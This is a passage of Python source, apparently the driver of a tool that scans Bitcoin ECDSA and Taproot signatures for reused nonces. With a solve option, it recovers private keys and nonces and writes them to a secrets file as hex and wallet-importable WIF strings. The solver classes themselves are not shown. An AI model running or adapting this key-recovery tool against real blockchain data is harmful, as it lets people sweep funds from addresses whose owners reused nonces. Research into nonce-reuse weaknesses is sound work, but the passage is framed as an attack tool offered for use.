    print(f"ECDSA: signatures={e_total} | unique_r={e_r} | unique_pubkeys={e_q}")
    print(f"Taproot: signatures={s_total} | unique_r_x={s_r} | unique_xonly_pubkeys={s_q}")

    e_dup = ecdsa_analyzer.detect_duplicate_rq()
    s_dup = schnorr_analyzer.detect_duplicate_rq()
    print(f"Detected potential leaks: ECDSA={len(e_dup)} | Taproot={len(s_dup)}")

    findings = [{"kind": f.kind, "detail": f.detail} for f in e_dup + s_dup]
    if args.out_json and findings:
        with open(args.out_json, "w") as f: 
            json.dump(findings, f, indent=2)
        print(f"Wrote {len(findings)} findings to {args.out_json}")

    # Solver
    if args.solve:
        print("\n--- Solver Activated ---")
        secrets = {"network": chain, "ecdsa": {"keys": [], "nonces": []}, "taproot": {"keys": [], "nonces": []}}
        
        # ECDSA
        try:
            e_solver = ECDSASolver(ecdsa_analyzer)
            x_by_q_e, k_by_r_e = e_solver.derive()
            print(f"ECDSA Solver: Recovered {len(x_by_q_e)} private keys and {len(k_by_r_e)} nonces.")
            secrets["ecdsa"]["keys"] = [{"pubkey": q, "priv_hex": f"{x:064x}", "wif": privkey_to_wif(x, compressed=True, testnet=(chain != 'main'))} for q, x in x_by_q_e.items()]
            secrets["ecdsa"]["nonces"] = [{"r": str(r), "k": f"{k:064x}"} for r, k in k_by_r_e.items()]
        except Exception as ex:
            print(f"ECDSA solver error: {ex}", file=sys.stderr)
            
        # Taproot
        try:
            s_solver = SchnorrSolver(schnorr_analyzer)
            x_by_q_s, k_by_r_s = s_solver.derive()
            print(f"Taproot Solver: Recovered {len(x_by_q_s)} private keys and {len(k_by_r_s)} nonces.")
            secrets["taproot"]["keys"] = [{"xonly_pubkey": q, "priv_hex": f"{x:064x}"} for q, x in x_by_q_s.items()]
            secrets["taproot"]["nonces"] = [{"r_x": str(r), "k": f"{k:064x}"} for r, k in k_by_r_s.items()]
        except Exception as ex:
            print(f"Taproot solver error: {ex}", file=sys.stderr)

        if args.out_secrets:
            with open(args.out_secrets, "w") as f: 
                json.dump(secrets, f, indent=2)
            print(f"Wrote recovered secrets to {args.out_secrets}")

if __name__ == "__main__":
    main()